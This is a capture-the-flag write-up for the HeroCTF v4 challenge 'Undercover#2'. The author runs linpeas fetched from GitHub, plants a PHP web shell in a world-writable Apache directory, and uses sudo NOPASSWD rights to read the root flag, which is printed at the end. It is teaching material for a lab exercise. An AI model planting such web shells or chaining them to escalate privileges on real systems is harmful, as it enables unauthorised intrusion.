# HeroCTF v4

## System

### Undercover#2

**Difficulty:** Medium

**Statement:** Now that you proved yourself, You have to assess the security of one of their developpers systems. He's a very good coder, but not that good at keeping his system safe. Could you report to us any vulnerabilities you find in his system?

The base credentials are: `user1:password123`

***

Once connected, I start by searching for a local vulnerability with **linpeas** :

```
# user1@1e2ce5f20fec:/tmp$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh
# user1@1e2ce5f20fec:/tmp$ ./linpeas.sh
```

Through this, I notice several points:
- The apache2 service is running with the dev user
```
root           1  0.0  0.0  18388  3080 ?        Ss   10:56   0:00 /bin/bash /root/start.sh
root           7  0.0  0.0   4640   876 ?        S    10:56   0:00 /bin/sh /usr/sbin/apachectl -D FOREGROUND
root          11  0.0  0.1 327136 21108 ?        S    10:56   0:00  _ /usr/sbin/apache2 -D FOREGROUND
dev           12  0.0  0.0 331536 11056 ?        S    10:56   0:00      _ /usr/sbin/apache2 -D FOREGROUND
dev           13  0.0  0.0 331536 11056 ?        S    10:56   0:00      _ /usr/sbin/apache2 -D FOREGROUND
dev           14  0.0  0.0 331536 11056 ?        S    10:56   0:00      _ /usr/sbin/apache2 -D FOREGROUND
dev           15  0.0  0.0 331536 11056 ?        S    10:56   0:00      _ /usr/sbin/apache2 -D FOREGROUND
dev           16  0.0  0.0 331536 11056 ?        S    10:56   0:00      _ /usr/sbin/apache2 -D FOREGROUND
root          10  0.0  0.0  72312  5776 ?        S    10:56   0:00 /usr/sbin/sshd -D
user1         28  0.0  0.0 103864  3480 ?        S    10:57   0:00      _ sshd: user1@pts/0
user1         29  0.0  0.0  20368  3952 pts/0    Ss   10:57   0:00          _ -bash
user1         41  1.2  0.0   5480  2700 pts/0    S+   11:00   0:00              _ /bin/sh ./linpeas.sh
user1       2838  0.0  0.0   5480   968 pts/0    S+   11:00   0:00                  _ /bin/sh ./linpeas.sh
user1       2841  0.0  0.0  36164  3340 pts/0    R+   11:00   0:00                  |   _ ps fauxwww
user1       2842  0.0  0.0   5480   968 pts/0    S+   11:00   0:00                  _ /bin/sh ./linpeas.sh
```
- The /var/www/html directory is read/write for everyone
```
drwxrwxrwx 1 root root 4096 Apr  8 10:48 /var/www/html
```

So I decide to create a `shell.php` in `/var/www/html/` file with the following content in order to execute commands through the **cmd** parameter with the rights of the dev user :

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

I check that the commands are executed with the user dev :

```
# user1@1e2ce5f20fec:/var/www/html$ curl localhost/shell.php?cmd=id
<html>
<body>
<form method="GET" name="shell.php">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
uid=1000(dev) gid=1000(dev) groups=1000(dev)
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

I check if the dev user has any authorized commands via sudo :

```
# user1@1e2ce5f20fec:/var/www/html$ curl localhost/shell.php?cmd=sudo%20-l
<html>
<body>
<form method="GET" name="shell.php">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
Matching Defaults entries for dev on 1e2ce5f20fec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev may run the following commands on 1e2ce5f20fec:
    (ALL) NOPASSWD: ALL
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

We can see the value `(ALL) NOPASSWD: ALL`, which means that we can execute all sudo commands without password.

I just have to get the flag in the root directory :

```
user1@1e2ce5f20fec:/var/www/html$ curl localhost/shell.php?cmd=sudo%20cat%20/root/flag.txt
<html>
<body>
<form method="GET" name="shell.php">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
Hero{3w-d4ta_1s_n0t_us3l3s5}</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Flag: Hero{3w-d4ta_1s_n0t_us3l3s5}
